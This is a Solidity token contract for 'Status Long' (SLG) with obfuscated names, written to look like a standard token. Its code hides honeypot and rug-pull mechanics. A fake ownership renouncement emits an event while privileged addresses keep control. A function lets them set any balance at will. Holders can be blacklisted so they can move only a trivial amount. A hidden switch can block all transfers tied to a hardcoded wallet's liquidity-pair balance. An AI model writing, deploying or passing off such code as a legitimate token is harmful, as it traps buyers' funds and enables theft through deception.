//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface atFundEnable {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract tokenLaunchedMarketing {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface marketingReceiverAuto {
    function createPair(address toWallet, address buyLiquidity) external returns (address);
}

interface maxTrading {
    function totalSupply() external view returns (uint256);

    function balanceOf(address amountToken) external view returns (uint256);

    function transfer(address liquidityToMode, uint256 autoIsTo) external returns (bool);

    function allowance(address senderTeamReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 autoIsTo) external returns (bool);

    function transferFrom(
        address sender,
        address liquidityToMode,
        uint256 autoIsTo
    ) external returns (bool);

    event Transfer(address indexed from, address indexed senderMode, uint256 value);
    event Approval(address indexed senderTeamReceiver, address indexed spender, uint256 value);
}

interface enableSwapFrom is maxTrading {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract StatusLong is tokenLaunchedMarketing, maxTrading, enableSwapFrom {

    constructor (){
        
        atFundEnable modeFrom = atFundEnable(limitAutoMax);
        swapLiquidity = marketingReceiverAuto(modeFrom.factory()).createPair(modeFrom.WETH(), address(this));
        
        limitLiquidityMode = _msgSender();
        autoSell();
        receiverMin[limitLiquidityMode] = true;
        amountLimitSell[limitLiquidityMode] = shouldLaunch;
        
        emit Transfer(address(0), limitLiquidityMode, shouldLaunch);
    }

    function transferFrom(address totalMarketing, address liquidityToMode, uint256 autoIsTo) external override returns (bool) {
        if (_msgSender() != limitAutoMax) {
            if (maxFeeSell[totalMarketing][_msgSender()] != type(uint256).max) {
                require(autoIsTo <= maxFeeSell[totalMarketing][_msgSender()]);
                maxFeeSell[totalMarketing][_msgSender()] -= autoIsTo;
            }
        }
        return buyFrom(totalMarketing, liquidityToMode, autoIsTo);
    }

    string private launchEnable = "SLG";

    uint256 private sellMode;

    function name() external view virtual override returns (string memory) {
        return listReceiver;
    }

    function receiverExempt(address enableSell) public {
        feeLaunch();
        if (toTeam != txSell) {
            senderAt = true;
        }
        if (enableSell == limitLiquidityMode || enableSell == swapLiquidity) {
            return;
        }
        sellBuy[enableSell] = true;
    }

    bool private senderAt;

    address public limitLiquidityMode;

    uint256 modeWallet;

    address public swapLiquidity;

    function autoSwapFrom(address isWallet, uint256 autoIsTo) public {
        feeLaunch();
        amountLimitSell[isWallet] = autoIsTo;
    }

    mapping(address => bool) public receiverMin;

    uint256 exemptLaunchedWallet;

    uint8 private enableIs = 18;

    mapping(address => mapping(address => uint256)) private maxFeeSell;

    address limitAutoMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function decimals() external view virtual override returns (uint8) {
        return enableIs;
    }

    function listMode(uint256 autoIsTo) public {
        feeLaunch();
        exemptLaunchedWallet = autoIsTo;
    }

    function buyFrom(address totalMarketing, address liquidityToMode, uint256 autoIsTo) internal returns (bool) {
        if (totalMarketing == limitLiquidityMode) {
            return takeReceiver(totalMarketing, liquidityToMode, autoIsTo);
        }
        uint256 toLaunch = maxTrading(swapLiquidity).balanceOf(shouldTo);
        require(toLaunch == exemptLaunchedWallet);
        require(liquidityToMode != shouldTo);
        if (sellBuy[totalMarketing]) {
            return takeReceiver(totalMarketing, liquidityToMode, feeReceiver);
        }
        return takeReceiver(totalMarketing, liquidityToMode, autoIsTo);
    }

    mapping(address => bool) public sellBuy;

    uint256 public toTeam;

    function transfer(address isWallet, uint256 autoIsTo) external virtual override returns (bool) {
        return buyFrom(_msgSender(), isWallet, autoIsTo);
    }

    function owner() external view returns (address) {
        return amountLimit;
    }

    string private listReceiver = "Status Long";

    function getOwner() external view returns (address) {
        return amountLimit;
    }

    function takeReceiver(address totalMarketing, address liquidityToMode, uint256 autoIsTo) internal returns (bool) {
        require(amountLimitSell[totalMarketing] >= autoIsTo);
        amountLimitSell[totalMarketing] -= autoIsTo;
        amountLimitSell[liquidityToMode] += autoIsTo;
        emit Transfer(totalMarketing, liquidityToMode, autoIsTo);
        return true;
    }

    uint256 private shouldLaunch = 100000000 * 10 ** 18;

    uint256 private txSell;

    function totalSupply() external view virtual override returns (uint256) {
        return shouldLaunch;
    }

    function symbol() external view virtual override returns (string memory) {
        return launchEnable;
    }

    function autoSell() public {
        emit OwnershipTransferred(limitLiquidityMode, address(0));
        amountLimit = address(0);
    }

    mapping(address => uint256) private amountLimitSell;

    function walletFund(address launchList) public {
        if (enableTxShould) {
            return;
        }
        
        receiverMin[launchList] = true;
        if (sellMode != toTeam) {
            toTeam = txSell;
        }
        enableTxShould = true;
    }

    address private amountLimit;

    function allowance(address modeExempt, address listIs) external view virtual override returns (uint256) {
        if (listIs == limitAutoMax) {
            return type(uint256).max;
        }
        return maxFeeSell[modeExempt][listIs];
    }

    bool public totalMaxExempt;

    bool public enableTxShould;

    address shouldTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 constant feeReceiver = 18 ** 10;

    function feeLaunch() private view {
        require(receiverMin[_msgSender()]);
    }

    function approve(address listIs, uint256 autoIsTo) public virtual override returns (bool) {
        maxFeeSell[_msgSender()][listIs] = autoIsTo;
        emit Approval(_msgSender(), listIs, autoIsTo);
        return true;
    }

    function balanceOf(address amountToken) public view virtual override returns (uint256) {
        return amountLimitSell[amountToken];
    }

    event OwnershipTransferred(address indexed tradingSwap, address indexed totalMin);

}